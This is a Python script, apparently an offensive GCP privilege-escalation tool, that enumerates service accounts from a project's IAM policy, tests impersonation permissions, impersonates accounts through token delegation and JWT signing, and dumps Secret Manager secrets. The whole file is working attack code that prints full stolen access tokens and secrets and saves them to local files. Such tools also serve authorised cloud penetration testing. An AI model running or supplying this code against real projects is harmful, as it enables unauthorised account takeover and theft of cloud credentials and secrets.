#!/usr/bin/env python3

import argparse
import json
import requests
import time
import base64
import os # <-- Added import
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from google.auth.exceptions import GoogleAuthError, RefreshError
import google.auth.transport.requests # Required for token refresh

# Default filename for saving discovered SAs
DEFAULT_SA_OUTPUT_FILE = "discovered_sas.txt"

# --- Authentication Functions ---

def get_credentials_from_keyfile(key_file_path, scopes=None):
    """Authenticates using a service account key file."""
    if not scopes:
        scopes = ['https://www.googleapis.com/auth/cloud-platform']
    try:
        credentials = service_account.Credentials.from_service_account_file(
            key_file_path, scopes=scopes)
        return credentials
    except FileNotFoundError:
        print(f"Error: Key file not found at {key_file_path}")
        return None
    except Exception as e:
        print(f"Error loading credentials from key file: {e}")
        return None

def get_access_token(credentials):
    """Refreshes and returns an access token from credentials."""
    try:
        # Create a transport request object using the default session
        request = google.auth.transport.requests.Request()
        # Refresh token if necessary, passing the correct transport request object
        credentials.refresh(request)
        return credentials.token
    except RefreshError as e: # Catch specific token refresh errors
         print(f"Error refreshing token: {e}")
         return None
    except GoogleAuthError as e: # Catch other auth errors
        print(f"Error obtaining access token: {e}")
        return None
    except Exception as e: # Catch other potential errors during refresh
        print(f"An unexpected error occurred obtaining token: {e}")
        return None

# --- API Interaction Functions ---

def get_project_iam_policy(credentials, project_id, output_sa_file=DEFAULT_SA_OUTPUT_FILE): # <-- Added output_sa_file parameter
    """Gets the IAM policy for the project, extracts service accounts, and saves them to a file."""
    print(f"[*] Attempting to get IAM policy for project: {project_id}")
    try:
        service = build('cloudresourcemanager', 'v1', credentials=credentials)
        policy = service.projects().getIamPolicy(resource=project_id, body={}).execute()
        print("\n[+] Successfully retrieved IAM policy:")
        # Optional: Reduce verbosity by default?
        # print(json.dumps(policy, indent=2))

        service_accounts = set()
        if 'bindings' in policy:
            for binding in policy['bindings']:
                if 'members' in binding:
                    for member in binding['members']:
                        if member.startswith('serviceAccount:'):
                            service_accounts.add(member.split(':', 1)[1])

        sorted_service_accounts = sorted(list(service_accounts))

        if sorted_service_accounts:
            print("\n[+] Found Service Accounts in bindings:")
            for sa in sorted_service_accounts:
                print(f"  - {sa}")

            # --- Save to file ---
            print(f"\n[*] Attempting to save Service Accounts to: {output_sa_file}")
            try:
                with open(output_sa_file, 'w') as f:
                    for sa in sorted_service_accounts:
                        f.write(sa + '\n')
                print(f"[+] Service accounts successfully saved.")
            except IOError as e:
                print(f"[-] Error writing service accounts to file {output_sa_file}: {e}")
            # --- End save to file ---

        else:
            print("\n[-] No service accounts found in IAM policy bindings.")
        return policy, sorted_service_accounts

    except HttpError as e:
        print(f"\n[-] Error getting IAM policy: {e}")
        if e.resp.status == 403:
            print("[-] Permission denied (iam.projects.getIamPolicy likely missing).")
        return None, []
    except Exception as e:
        print(f"\n[-] An unexpected error occurred: {e}")
        return None, []

# (Keep test_sa_permissions, generate_token_with_delegation, sign_and_exchange_jwt, list_secrets, access_secret_version functions as they are)
# ... (rest of the functions remain unchanged) ...
def test_sa_permissions(access_token, target_sas):
    """Tests dangerous permissions on target service accounts."""
    print("\n[*] Testing permissions on target Service Accounts...")
    permissions_to_test = [
        "iam.serviceAccounts.getAccessToken",
        "iam.serviceAccounts.signJwt",
        "iam.serviceAccounts.implicitDelegation",
        "iam.serviceAccounts.actAs"
    ]
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    data = json.dumps({'permissions': permissions_to_test})
    results = {}

    if not target_sas:
        print("[-] No target Service Accounts provided or loaded to test.")
        return results

    print(f"[*] Will test permissions on {len(target_sas)} Service Account(s).")
    for sa in target_sas:
        print(f"  - Checking permissions on: {sa}")
        url = f"https://iam.googleapis.com/v1/projects/-/serviceAccounts/{sa}:testIamPermissions"
        try:
            response = requests.post(url, headers=headers, data=data, timeout=15)
            response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
            granted_permissions = response.json().get('permissions', [])
            if granted_permissions:
                print(f"  [+] Granted permissions found for {sa}: {', '.join(granted_permissions)}")
                results[sa] = granted_permissions
            # else: No output if no permissions granted for cleaner results
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                 print(f"  [-] Permission denied when testing {sa}. Does the SA exist or current identity lack iam.serviceAccounts.testIamPermissions?")
            elif e.response.status_code == 404:
                 print(f"  [-] Service Account {sa} not found.")
            else:
                error_info = ""
                try: # Try to get more specific error details
                    error_info = f" Details: {e.response.json().get('error', {}).get('message', '(no details)')}"
                except json.JSONDecodeError: pass
                print(f"  [-] HTTP Error testing permissions on {sa}: {e}{error_info}")
        except requests.exceptions.RequestException as e:
            print(f"  [-] Network Error testing permissions on {sa}: {e}")
        except json.JSONDecodeError:
            print(f"  [-] Error decoding JSON response for {sa}. Response: {response.text[:100]}...")
        except Exception as e:
            print(f"  [-] An unexpected error occurred for {sa}: {e}")

    if not results:
        print("[-] No specific dangerous permissions found on target Service Accounts.")

    return results

def generate_token_with_delegation(access_token, target_sas, delegate_sa):
    """Attempts to generate access token for target SAs via a delegate SA."""
    print(f"\n[*] Attempting to generate access tokens for target SAs via delegate: {delegate_sa}")
    # ... (headers, scope, data setup remains the same) ...
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    scope = ["https://www.googleapis.com/auth/cloud-platform"]
    delegate_full_path = f"projects/-/serviceAccounts/{delegate_sa}"
    data = json.dumps({
        "delegates": [delegate_full_path],
        "scope": scope
    })
    generated_tokens = {}

    if not target_sas:
        print("[-] No target Service Accounts provided or loaded for token generation.")
        return generated_tokens
    if not delegate_sa:
        print("[-] Delegate Service Account (--delegate-sa) not provided.")
        return generated_tokens

    print(f"[*] Will attempt token generation for {len(target_sas)} Service Account(s) via {delegate_sa}.")
    for sa in target_sas:
        print(f"  - Attempting token generation for: {sa}")
        url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{sa}:generateAccessToken"
        try:
            response = requests.post(url, headers=headers, data=data, timeout=15)
            if response.status_code == 200:
                token_info = response.json()
                new_token = token_info.get('accessToken')
                if new_token:
                    print(f"  [+] SUCCESS! Generated token for {sa} via {delegate_sa}:")
                    # --- Print full token ---
                    print(f"      Token: {new_token}") # <-- Changed: Print full token
                    print(f"      Expires: {token_info.get('expireTime')}")
                    generated_tokens[sa] = new_token

                    # --- Save token to file ---
                    # Replace potentially invalid filename characters
                    safe_sa_name = sa.replace('@', '_at_').replace(':', '_')
                    token_filename = f"{safe_sa_name}.token"
                    print(f"      [*] Saving token to file: {token_filename}")
                    try:
                        with open(token_filename, 'w') as f:
                            f.write(new_token)
                        print(f"      [+] Token saved successfully.")
                    except IOError as e:
                        print(f"      [-] Error saving token to {token_filename}: {e}")
                    # --- End save token to file ---

                else:
                    print(f"  [-] Request succeeded for {sa}, but no token found in response.")
            elif response.status_code == 403:
                 pass # Reduce noise for expected failures
            else:
                # Print other unexpected errors
                error_info = ""
                try: error_info = f" Details: {response.json().get('error', {}).get('message', '(no details)')}"
                except json.JSONDecodeError: pass
                print(f"  [-] HTTP Error {response.status_code} during token generation for {sa}:{error_info}")

        except requests.exceptions.RequestException as e:
            print(f"  [-] Network Error during token generation for {sa}: {e}")
        except json.JSONDecodeError:
             print(f"  [-] Error decoding JSON response for {sa}. Response: {response.text[:100]}...")
        except Exception as e:
            print(f"  [-] An unexpected error occurred for {sa}: {e}")

    if not generated_tokens:
        print(f"[-] Failed to generate any tokens via delegate {delegate_sa}.")

    return generated_tokens # Return dict of generated tokens {sa_email: token}


def sign_and_exchange_jwt(access_token, impersonate_sa):
    """Signs a JWT as the impersonate_sa using the current token and exchanges it."""
    print(f"\n[*] Attempting to sign JWT as {impersonate_sa} and exchange for its token...")
    # ... (JWT Claim creation, Sign JWT request remains the same) ...
    # 1. Create JWT Claims
    iat = int(time.time())
    exp = iat + 3600  # Expires in 1 hour
    claims = {
        "iss": impersonate_sa,
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "aud": "https://oauth2.googleapis.com/token",
        "exp": exp,
        "iat": iat
    }
    payload_json = json.dumps(claims)

    # 2. Sign the JWT using iamcredentials API
    sign_jwt_url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{impersonate_sa}:signJwt"
    sign_headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json'
    }
    sign_data = json.dumps({"payload": payload_json})

    print(f"  - Requesting signature for JWT from {impersonate_sa}...")
    signed_jwt = None
    try:
        response = requests.post(sign_jwt_url, headers=sign_headers, data=sign_data, timeout=15)
        response.raise_for_status()
        signed_jwt = response.json().get('signedJwt')
        if signed_jwt:
             print(f"  [+] Successfully obtained signed JWT.")
        else:
            print(f"  [-] Failed to get signed JWT from response: {response.text}")
            return None
    except requests.exceptions.HTTPError as e:
        error_info = ""
        try: error_info = f" Details: {e.response.json().get('error', {}).get('message', '(no details)')}"
        except json.JSONDecodeError: pass
        print(f"  [-] HTTP Error signing JWT: {e}{error_info}")
        if e.response.status_code == 403:
             print("  [-] Permission denied (iam.serviceAccounts.signJwt likely missing for the current identity on the target SA).")
        return None
    except requests.exceptions.RequestException as e:
        print(f"  [-] Network Error signing JWT: {e}")
        return None
    except json.JSONDecodeError:
        print(f"  [-] Error decoding JSON response during signing. Response: {response.text[:100]}...")
        return None
    except Exception as e:
        print(f"  [-] An unexpected error occurred during signing: {e}")
        return None

    # 3. Exchange the signed JWT for an Access Token
    print(f"  - Exchanging signed JWT for {impersonate_sa}'s access token...")
    token_url = "https://oauth2.googleapis.com/token"
    exchange_headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    exchange_data = f"grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={signed_jwt}"

    try:
        response = requests.post(token_url, headers=exchange_headers, data=exchange_data, timeout=15)
        response.raise_for_status()
        token_info = response.json()
        new_access_token = token_info.get('access_token')
        if new_access_token:
            print(f"  [+] SUCCESS! Obtained access token for {impersonate_sa}:")
             # --- Print full token ---
            print(f"      Token: {new_access_token}") # <-- Changed: Print full token
            print(f"      Expires in: {token_info.get('expires_in')} seconds")

            # --- Save token to file ---
            safe_sa_name = impersonate_sa.replace('@', '_at_').replace(':', '_')
            token_filename = f"{safe_sa_name}.token"
            print(f"      [*] Saving token to file: {token_filename}")
            try:
                with open(token_filename, 'w') as f:
                    f.write(new_access_token)
                print(f"      [+] Token saved successfully.")
            except IOError as e:
                print(f"      [-] Error saving token to {token_filename}: {e}")
            # --- End save token to file ---

            return new_access_token # Return the token as before
        else:
            print(f"  [-] Failed to get access token from exchange response: {response.text}")
            return None
    except requests.exceptions.HTTPError as e:
        error_info = ""
        try: error_info = f" Details: {e.response.json().get('error', {}).get('message', '(no details)')}"
        except json.JSONDecodeError: pass
        print(f"  [-] HTTP Error exchanging JWT: {e}{error_info}")
        return None
    except requests.exceptions.RequestException as e:
        print(f"  [-] Network Error exchanging JWT: {e}")
        return None
    except json.JSONDecodeError:
        print(f"  [-] Error decoding JSON response during exchange. Response: {response.text[:100]}...")
        return None
    except Exception as e:
        print(f"  [-] An unexpected error occurred during exchange: {e}")
        return None
def list_secrets(access_token, project_id):
    """Lists secrets in the project using Secret Manager API."""
    print(f"\n[*] Listing secrets in project: {project_id}")
    url = f"https://secretmanager.googleapis.com/v1/projects/{project_id}/secrets"
    headers = {'Authorization': f'Bearer {access_token}'}
    secrets_list = []

    try:
        response = requests.get(url, headers=headers, timeout=15)
        response.raise_for_status()
        secrets_data = response.json()
        secrets_found = secrets_data.get('secrets', [])
        if secrets_found:
            print("[+] Found Secrets:")
            for secret in secrets_found:
                # Handle potential missing 'name' key gracefully
                secret_full_name = secret.get('name', 'UnknownSecretName')
                secret_name = secret_full_name.split('/')[-1] # Extract short name
                print(f"  - {secret_name} ({secret_full_name})")
                secrets_list.append(secret_name)
        else:
            print("[-] No secrets found in the project.")

    except requests.exceptions.HTTPError as e:
        error_info = ""
        try: # Try to get more specific error details
            error_info = f" Details: {e.response.json().get('error', {}).get('message', '(no details)')}"
        except json.JSONDecodeError: pass
        print(f"[-] HTTP Error listing secrets: {e}{error_info}")
        if e.response.status_code == 403:
            print("[-] Permission denied (secretmanager.secrets.list likely missing).")
        elif e.response.status_code == 404:
             print(f"[-] Project '{project_id}' not found or Secret Manager API not enabled.")
        elif 'serviceusage.googleapis.com' in str(e) or (error_info and 'service is not enabled' in error_info.lower()):
             print("[-] Secret Manager API might not be enabled for this project.")

    except requests.exceptions.RequestException as e:
        print(f"[-] Network Error listing secrets: {e}")
    except json.JSONDecodeError:
        print(f"[-] Error decoding JSON response for listing secrets. Response: {response.text[:100]}...")
    except Exception as e:
        print(f"[-] An unexpected error occurred listing secrets: {e}")

    return secrets_list

def access_secret_version(access_token, project_id, secret_name, version="latest"):
    """Accesses a specific secret version."""
    print(f"\n[*] Accessing secret version: {secret_name} (version: {version}) in project: {project_id}")
    url = f"https://secretmanager.googleapis.com/v1/projects/{project_id}/secrets/{secret_name}/versions/{version}:access"
    headers = {'Authorization': f'Bearer {access_token}'}

    try:
        response = requests.get(url, headers=headers, timeout=15)
        response.raise_for_status()
        secret_data = response.json()
        if 'payload' in secret_data and 'data' in secret_data['payload']:
            encoded_secret = secret_data['payload']['data']
            try:
                decoded_secret = base64.b64decode(encoded_secret).decode('utf-8', errors='replace') # Use replace for potential decode errors
                print(f"[+] Successfully accessed secret '{secret_name}':")
                print("--- BEGIN SECRET ---")
                print(decoded_secret)
                print("--- END SECRET ---")
                return decoded_secret
            except Exception as decode_e:
                print(f"[+] Accessed secret '{secret_name}', but failed to decode cleanly: {decode_e}")
                print(f"    Base64 Encoded: {encoded_secret}")
                # Return raw bytes if decoding fails but access worked
                return base64.b64decode(encoded_secret)
        else:
            print("[-] Secret payload data not found in response.")
            return None

    except requests.exceptions.HTTPError as e:
        error_info = ""
        try: # Try to get more specific error details
            error_info = f" Details: {e.response.json().get('error', {}).get('message', '(no details)')}"
        except json.JSONDecodeError: pass
        print(f"[-] HTTP Error accessing secret '{secret_name}': {e}{error_info}")
        if e.response.status_code == 403:
            print("[-] Permission denied (secretmanager.versions.access likely missing).")
        elif e.response.status_code == 404:
             print(f"[-] Secret or version '{secret_name}/{version}' not found.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Network Error accessing secret '{secret_name}': {e}")
    except json.JSONDecodeError:
        print(f"[-] Error decoding JSON response for accessing secret. Response: {response.text[:100]}...")
    except Exception as e:
        print(f"[-] An unexpected error occurred accessing secret: {e}")

    return None

# --- Main Execution ---

def main():
    parser = argparse.ArgumentParser(description="GCP Service Account Enumeration Tool")

    # Authentication Group (Mutually Exclusive)
    auth_group = parser.add_mutually_exclusive_group(required=True)
    auth_group.add_argument("--key-file", help="Path to the Service Account JSON key file.")
    auth_group.add_argument("--token", help="An existing OAuth2 access token.")

    # Required Arguments
    parser.add_argument("--project-id", required=True, help="Target GCP Project ID.")

    # Action Group
    parser.add_argument("--action", required=True, choices=[
        "get-iam-policy",       # Gets project IAM policy and lists SAs
        "test-sa-perms",        # Tests permissions on target SAs
        "generate-token-delegate", # Tries generateAccessToken via delegation
        "sign-jwt",             # Tries signJwt and exchanges for token
        "list-secrets",         # Lists secrets in the project
        "access-secret"         # Accesses a specific secret version
    ], help="The enumeration action to perform.")

    # Optional Arguments for specific actions
    # Updated help text for --target-sas
    parser.add_argument("--target-sas", help="File path containing target Service Account emails (one per line) OR comma-separated list of emails (for test-sa-perms, generate-token-delegate).")
    parser.add_argument("--delegate-sa", help="The Service Account email to use in the delegate chain (for generate-token-delegate).")
    parser.add_argument("--impersonate-sa", help="The Service Account email to impersonate via signJwt (for sign-jwt).")
    parser.add_argument("--secret-name", help="The name of the secret to access (for access-secret).")
    parser.add_argument("--secret-version", default="latest", help="The version of the secret to access (default: latest).")
    parser.add_argument("--sa-output-file", default=DEFAULT_SA_OUTPUT_FILE, help=f"Output file for discovered service accounts (used by get-iam-policy). Default: {DEFAULT_SA_OUTPUT_FILE}")


    args = parser.parse_args()

    # --- Authentication ---
    access_token = None
    credentials = None # Keep credentials if needed for googleapiclient

    if args.key_file:
        print(f"[*] Authenticating using key file: {args.key_file}")
        credentials = get_credentials_from_keyfile(args.key_file)
        if not credentials:
            return # Error message already printed
        access_token = get_access_token(credentials)
        if not access_token:
             return # Error message already printed
        print("[+] Authentication successful. Token obtained.")
    elif args.token:
        print("[*] Using provided access token.")
        access_token = args.token
        # Note: `credentials` will be None here. Actions needing it will fail if called.

    if not access_token:
        print("[-] Failed to obtain an access token. Exiting.")
        return

    # --- Parse Target SAs (File or List) ---  <-- Updated Logic
    target_sas_list = []
    if args.target_sas:
        target_input = args.target_sas
        if os.path.isfile(target_input):
            print(f"[*] Reading target Service Accounts from file: {target_input}")
            try:
                with open(target_input, 'r') as f:
                    # Read lines, strip whitespace, filter out empty lines/comments
                    target_sas_list = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
                if not target_sas_list:
                    print(f"[!] Warning: File {target_input} found but contains no valid Service Account emails (or only comments/empty lines).")
                else:
                    print(f"[+] Loaded {len(target_sas_list)} Service Accounts from {target_input}.")
            except IOError as e:
                print(f"[-] Error reading target SA file {target_input}: {e}")
                # Continue with empty list, actions that need it will report error
        else:
            # Treat as comma-separated list if not a file
            print("[*] Parsing target Service Accounts from command line string.")
            target_sas_list = [sa.strip() for sa in target_input.split(',') if sa.strip()]
            if not target_sas_list:
                 print("[!] Warning: --target-sas provided but no valid emails found after parsing.")
            else:
                print(f"[+] Parsed {len(target_sas_list)} Service Accounts from command line.")

    # --- Execute Action ---
    if args.action == "get-iam-policy":
        if not credentials:
             print("[-] Action 'get-iam-policy' requires authentication via --key-file to use the client library.")
             return
        # Pass the output filename from args
        get_project_iam_policy(credentials, args.project_id, args.sa_output_file)

    elif args.action == "test-sa-perms":
        if not target_sas_list:
             print(f"[-] Action 'test-sa-perms' requires target Service Accounts. Provide a file or list via --target-sas (e.g., --target-sas {args.sa_output_file}).")
             return
        test_sa_permissions(access_token, target_sas_list)

    elif args.action == "generate-token-delegate":
         if not target_sas_list:
             print(f"[-] Action 'generate-token-delegate' requires target Service Accounts. Provide a file or list via --target-sas (e.g., --target-sas {args.sa_output_file}).")
             return
         if not args.delegate_sa:
             print("[-] Action 'generate-token-delegate' requires --delegate-sa.")
             return
         generate_token_with_delegation(access_token, target_sas_list, args.delegate_sa)

    elif args.action == "sign-jwt":
        if not args.impersonate_sa:
            print("[-] Action 'sign-jwt' requires --impersonate-sa.")
            return
        sign_and_exchange_jwt(access_token, args.impersonate_sa)

    elif args.action == "list-secrets":
        list_secrets(access_token, args.project_id)

    elif args.action == "access-secret":
        if not args.secret_name:
            print("[-] Action 'access-secret' requires --secret-name.")
            return
        access_secret_version(access_token, args.project_id, args.secret_name, args.secret_version)

    else:
        # This case should not be reachable due to argparse 'choices'
        print(f"[-] Internal error: Unknown action specified: {args.action}")


if __name__ == "__main__":
    main()